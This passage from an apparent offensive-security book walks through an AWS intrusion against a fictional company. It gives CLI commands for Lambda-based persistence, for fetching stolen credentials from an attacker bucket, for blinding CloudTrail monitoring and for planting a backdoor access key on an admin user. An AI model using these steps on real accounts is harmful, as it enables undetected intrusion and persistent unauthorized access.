- pgno: 214
  md: "We explicitly allow the S3 service to call our Lambda function. The statement-id\
    \ parameter is an arbitrary, unique name:\n\n```\nroot@Pointi1:~# aws lambda add-permission\
    \ \\\n--function-name support-metrics-calc \\\n--region eu-west-1 \\\n--statement-id\
    \ s3InvokeLambda12 \\\n--action \"lambda:InvokeFunction\" \\\n--principal s3.amazonaws.com\
    \ \\\n--source-arn arn:aws:s3:::s4d.mxrads.com \\\n--source-account 886371554408\
    \ \\\n--profile jenkins\n```\n\nThen, we set up the bucket rule that only triggers\
    \ events upon creating objects starting with the \"2\" prefix:\n\n```\nroot@Pointi1:~#\
    \ aws s3api put-bucket-notification-configuration \\\n--region eu-west-1 \\\n\
    --bucket mxrads-mywebhook \\\n--profile jenkins \\\n--notification-configuration\
    \ file://<(cat << EOF\n{\n    \"LambdaFunctionConfigurations\": [{\n        \"\
    Id\": \"s3InvokeLambda12\",\n        \"LambdaFunctionArn\": \"arn:aws:lambda:eu-west-1:886371554408\n\
    :function:support-metrics-calc\",\n        \"Events\": [\"s3:ObjectCreated:*\"\
    ],\n        \"Filter\": {\n            \"Key\": {\n                \"FilterRules\"\
    : [{\n                    \"Name\": \"prefix\",\n                    \"Value\"\
    : \"2\"\n                }]\n            }\n        }\n    }]\n}\nEOF\n)\n```\n\
    \nBrilliant. We have a solid persistence strategy that bypasses old and new detection\
    \ features alike.\n\nNow assume our Jenkins access gets revoked somehow and we\
    \ would like to use our Lambda credentials to re-establish permanent access. Should\
    \ we just spawn a new IAM user with unlimited privileges and carry on with our\
    \ lives? Not the wisest approach. Any monitoring solution based on CloudTrail\
    \ could pick up this odd request in a matter of minutes.\n\nThe current CloudTrail\
    \ configuration, as we saw earlier, aggregates logs from all regions into the\
    \ one eu-west-1 region. The logs are then pushed into S3 and CloudWatch where\
    \ they can be consumed by monitoring devices. This event-forwarding feature is\
    \ called a trail.\n\nBefore calling any IAM operation, we need to disrupt this\
    \ trail."
  merge: -1
  img_proc: true
- pgno: 215
  md: "# Covering Our Tracks\n\nNotice how our intention is not to disable logging\
    \ but to disrupt the trail itself. Indeed, it is currently impossible to completely\
    \ disable CloudTrail or make it skip events. No matter what we do, our API calls\
    \ will still be visible in the CloudTrail event dashboard for the next 90 days.\n\
    \nThe trail, however, can be reconfigured to omit forwarding certain events. It\
    \ can even black out entire regions while we carry out our nefarious tasks.\n\n\
    No trail means no logs on S3, no GuardDuty, no CloudTrail Insights, no CloudWatch\
    \ metrics, and no custom security dashboards. Just like dominos, all monitoring\
    \ tools inside and outside AWS will fall one after the other in a deafening silence.\
    \ We could add 100 IAM users or start 1,000 instances in São Paulo and nobody\
    \ would notice a thing, except perhaps for the accounting department.\n\n> NOTE\
    \ GuardDuty will still monitor and report unusual network traffic when VPC logs\
    \ are enabled, but there's nothing to stop us from playing with AWS APIs.\n\n\
    Here's a quick example showing how we can reconfigure the trail to exclude global\
    \ (IAM, STS, and so on) and multiregion events:\n\n```\nroot@Point1:~# curl https://mxrads-report-metrics.s3-eu-west-1.amazonaws.com/lambda\n\
    \nAWS_ACCESS_KEY_ID=ASIA44ZRK6WSTGTH5QLH\nAWS_SECRET_ACCESS_KEY=1vMoXxF9TjF2oMNEmu...\n\
    AWS_SESSION_TOKEN=IQoJb3JpZ2luXv2jEPT...\n\n# We load these ENV variables, then\
    \ disable CloudTrail global and multiregion logging\nroot@Point1:~# aws cloudtrail\
    \ update-trail \\\n  --name default \\\n  --no-include-global-service-events \\\
    \n  --no-is-multi-region \\\n  --region=eu-west\n\n\"Name\": \"default\",\n\"\
    S3BucketName\": \"mxrads-cloudtrail-logs\",\n\"IncludeGlobalServiceEvents\": false,\n\
    \"IsMultiRegionTrail\": false,\n--snip--\n```\n\nStarting from this instant, we\
    \ have carte blanche to create users and access keys, and do all sorts of tomfoolery.\
    \ Someone manually going through the CloudTrail dashboard might pick up on our\
    \ API calls if we are extremely careless, but all automated solutions and tools\
    \ will be in the dark.\n\n# Recovering Access\n\nNow that we have disabled CloudTrail,\
    \ we can move on to creating a more permanent set of AWS credentials."
  merge: -1
  img_proc: true
- pgno: 216
  md: 'Users and groups affiliated with the default admin policy are easy prey. IAM
    users are limited to two access keys, so we find a user with one or zero access
    keys and proceed to inject them with an additional key that we will secretly own.
    First, we list the users and groups:


    ```

    root@Pointi1:~/# aws iam list-entities-for-policy \

    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess


    UserName: b.daniella

    UserName: chris.hitch

    UserName: d.ressler

    --snip--

    ```


    Then we list their currently defined access keys:


    ```

    # List access keys. If they have less than 2, there''s room for another.

    root@Pointi1:~/# aws iam list-access-keys \

    --user b.daniella \

    | jq ".AccessKeyMetadata[].AccessKeyId"


    "AKIA44ZRK6WS2X5Q0Q4X"

    ```


    Great, b.daniella only has one key. With our target identified, we create an access
    key:


    ```

    root@Pointi1:~/# aws iam create-access-key --user b.daniella

    UserName: b.daniella,

    AccessKeyId: AKIA44ZRK6WSY37NET32,

    SecretAccessKey: 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,

    ```


    And we are back in business. We''ve regained permanent credentials.

    We cannot re-enable multiregion logging just yet, though. We need to wait at least
    half an hour after our last API call. This waiting period is critical, because
    it can take up to 20 minutes for the event to get to CloudTrail. If we reactivate
    global event logging too early, some of our actions might slip into the trail,
    and therefore into S3, Insights, CloudWatch, and other platforms.


    # Alternative (Worse) Methods


    You may be wondering why we don''t simply use the Lambda itself to automate subsequent
    IAM/CloudTrail actions. A Lambda function can only last a maximum of 15 minutes,
    so there is a reasonable chance it would re-enable global event logs too soon.
    We could hook another Lambda on our side to avoid this race condition, but that''s
    too much pipeline work for something so trivial.'
  merge: -1
  img_proc: true
- pgno: 217
  md: 'Alternatively, we could opt for running a reverse shell directly in the Lambda
    environment, but that''s far from convenient. The function runs in a minimal container
    where the filesystem is mounted as read-only, except for the /tmp folder, which
    lacks the executable flag. We would need to manually load the reverse shell in
    memory as an independent process, so it does not get terminated by the Lambda
    handler. All for what? A barren land lacking the most basic utilities that will
    be recycled by AWS in 60 minutes? Not worth the effort.


